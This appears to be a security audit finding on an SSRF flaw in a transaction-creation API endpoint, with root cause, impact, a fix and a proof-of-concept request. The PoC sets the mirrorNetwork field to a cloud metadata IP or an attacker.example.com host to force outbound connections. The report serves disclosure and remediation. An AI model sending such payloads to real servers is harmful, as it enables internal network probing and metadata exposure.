### Title
Unauthenticated-Reachable SSRF via Unvalidated `mirrorNetwork` Parameter in Transaction Creation

### Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any arbitrary string with no allowlist or format validation. When a transaction is submitted, the backend immediately uses this value to open an outbound gRPC connection to the supplied host before any other business-logic checks run. Any authenticated, verified user with at least one registered key can force the API server to make outbound TCP/gRPC connections to attacker-controlled infrastructure.

### Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` decorates `mirrorNetwork` with only `@IsNotEmpty()` and `@IsString()`: [1](#0-0) 

No `@IsIn([...])`, `@IsEnum(...)`, or pattern constraint is applied. Any non-empty string passes DTO validation.

**Exploit path — outbound connection before any other check:**

`createTransactions` immediately calls `getClientFromNetwork` with the raw user-supplied value before signature verification, expiry checks, or node validation: [2](#0-1) 

`getClientFromNetwork` falls through to the `default` branch for any unknown string, constructs a gRPC client pointing to `<attacker-host>:443`, and executes a live `AddressBookQuery` against it: [3](#0-2) 

`MirrorNetworkGRPC.fromBaseURL` confirms the default branch appends `:443` and returns the attacker-controlled URL verbatim: [4](#0-3) 

**Access gate:** The endpoint requires `JwtBlackListAuthGuard`, `JwtAuthGuard`, `VerifiedUserGuard`, and `HasKeyGuard`. A normal registered user who has uploaded at least one key satisfies all guards — no admin role is needed: [5](#0-4) 

### Impact Explanation

1. **SSRF / internal network probing**: The API server's egress IP is disclosed to the attacker's host. By supplying internal RFC-1918 addresses (e.g., `192.168.1.1`) or cloud metadata endpoints (e.g., `169.254.169.254`), the attacker can probe services that are reachable from the server but not from the public internet.
2. **Credential/metadata exfiltration**: In cloud-hosted deployments (AWS, GCP, Azure), the instance metadata service is reachable via the server's loopback/link-local interface. A gRPC dial to `169.254.169.254:443` will produce a TCP SYN that may elicit a response, confirming reachability and enabling further probing.
3. **Connection-hang DoS**: If the attacker's server accepts the TCP connection but never sends a gRPC response, the `AddressBookQuery` call blocks until the SDK timeout, tying up a server thread/connection slot per request.

### Likelihood Explanation

Any user who can register an account and upload one key can trigger this. The organization backend is designed to be accessible to multiple users. The attack requires only a crafted `POST /transactions` body — no special tooling, no admin access, and no cryptographic material beyond a valid JWT and one registered key.

### Recommendation

Add an allowlist validator to `mirrorNetwork` in `CreateTransactionDto`. The set of accepted values is already well-defined in the codebase:

```typescript
import { IsIn, IsString } from 'class-validator';
import { MAINNET, TESTNET, PREVIEWNET, LOCAL_NODE } from '@app/common';

@IsString()
@IsIn([MAINNET, TESTNET, PREVIEWNET, LOCAL_NODE])
mirrorNetwork: string;
```

If custom mirror-node URLs are a required product feature, they should be pre-registered by an admin and stored server-side; the client should supply only an opaque identifier, never a raw URL.

### Proof of Concept

```
POST /transactions HTTP/1.1
Authorization: Bearer <valid_user_jwt>
Content-Type: application/json

{
  "name": "ssrf-probe",
  "description": "test",
  "transactionBytes": "<valid_frozen_tx_hex>",
  "creatorKeyId": <user_key_id>,
  "signature": "<valid_sig_hex>",
  "mirrorNetwork": "169.254.169.254"   // or attacker.example.com
}
```

**Expected server behaviour:** `getClientFromNetwork("169.254.169.254")` constructs a gRPC client targeting `169.254.169.254:443` and fires `AddressBookQuery`. The TCP SYN reaches the metadata service (or attacker host). The attacker's server logs the connection, confirming the server's egress IP and that the internal address is reachable from the API host.
